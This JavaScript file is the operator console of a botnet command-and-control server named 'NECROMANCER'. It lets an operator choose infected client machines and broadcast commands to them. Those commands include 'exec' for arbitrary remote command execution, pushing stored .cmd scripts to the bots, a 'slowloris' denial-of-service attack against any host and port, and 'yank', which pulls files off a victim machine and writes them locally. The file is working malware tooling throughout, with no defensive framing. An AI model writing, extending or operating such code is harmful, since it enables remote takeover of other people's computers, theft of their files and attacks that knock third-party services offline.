import readline from "readline";
import fs from "fs";
import { clientModules, broadcast } from "./server.js";
import help from "../config/help.json" assert { type: "json" };

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});

let logging = false;
let fileNum = 0;

export function prompt() {
	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
		message = message.toLowerCase();

		// Commands
		const commandArgs = {
			firstArg: message.split(" ")[1],
			secondArg: message.split(" ")[2],
			thirdArg: message.split(" ")[3],
			fourthArg: message.split(" ")[4],
		};

		if (message.startsWith("instances")) {
			if (message === "instances") {
				console.log(
					`Instances: ${clientModules.clientInstances.length}`
				);
			} else if (commandArgs.firstArg <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances =
					clientModules.clientInstances.slice(
						0,
						commandArgs.firstArg
					);
			}
		}

		if (commandArgs.firstArg === "all")
			clientModules.clientInstances = [...clientModules.clients];

		if (message.startsWith("help")) {
			if (message === "help") {
				console.log("Commands:");
				for (let i = 0; i < help.length; i++) {
					console.log(help[i].command);
				}
			} else if (
				help.filter((i) => i.command === commandArgs.firstArg).length >
				0
			) {
				let commandIndex = help
					.map((i) => i.command)
					.indexOf(commandArgs.firstArg);

				console.log(
					`Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
				);
			}
		}

		if (message.startsWith("select")) {
			clientModules.clientInstances = Array(
				clientModules.clientInstances[commandArgs.firstArg]
			).filter((i) => i !== undefined);
		}

		if (message.startsWith("silent")) {
			if (message === "silent")
				console.log(`silent: ${clientModules.silent}`);
			else if (commandArgs.firstArg === "true") {
				clientModules.silent = true;
			} else {
				clientModules.silent = false;
			}
		}

		if (message.startsWith("logging")) {
			if (message === "logging") console.log(`logging: ${logging}`);
			else if (commandArgs.firstArg === "true") {
				logging = true;
				clientModules.silent = true;
			} else {
				logging = false;
				clientModules.silent = false;
			}
		}

		if (message === "clear") console.clear();

		if (message.startsWith("yank")) {
			if (clientModules.clientInstances.length > 1)
				return console.log(
					"You can only use this command on one machine at a time"
				);
			else {
				if (logging) {
					fileNum++;
					broadcast(message);
				} else console.log("Please enable logging to use this feature");
			}
		}

		// Scripts and attacks
		if (message === "scripts") {
			listScripts();
		}

		if (message.startsWith("run")) {
			runScript(commandArgs.firstArg);
		}

		if (message.startsWith("slowloris")) {
			if (message === "slowloris") {
				console.log(
					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
				);
			} else if (commandArgs.firstArg !== undefined) {
				broadcast(message);
				console.log(`Attack sent!`);
			}

			let duration = commandArgs.thirdArg;

			if (commandArgs.thirdArg === undefined) {
				duration = 60000;
			}

			setTimeout(() => {
				console.log("Attack completed!");
			}, duration);
		}

		if (message.startsWith("exec")) broadcast(message);

		return prompt();
	});
}

const scriptsDir = "../config/scripts";

function listScripts() {
	fs.readdir(scriptsDir, (err, files) => {
		console.log("\nList of scripts in script dir:");
		files.forEach((file) => {
			if (file.includes(".cmd")) console.log(`\x1b[34m${file}\x1b[0m`);
		});
		prompt();
	});
}

function runScript(scriptName) {
	fs.readdir(scriptsDir, (err, files) => {
		files.forEach((file) => {
			if (file === scriptName) {
				fs.readFile(
					`${scriptsDir}/${scriptName}`,
					"utf8",
					(err, data) => {
						console.log("\x1b[91mRunning script...\x1b[0m");
						broadcast(`exec ${data}`);
					}
				);
			}
		});
		prompt();
	});
}

export function saveFile(chunk) {
	const writeStream = fs.createWriteStream(`file ${fileNum}`, { flags: "a" });
	writeStream.write(chunk);
}
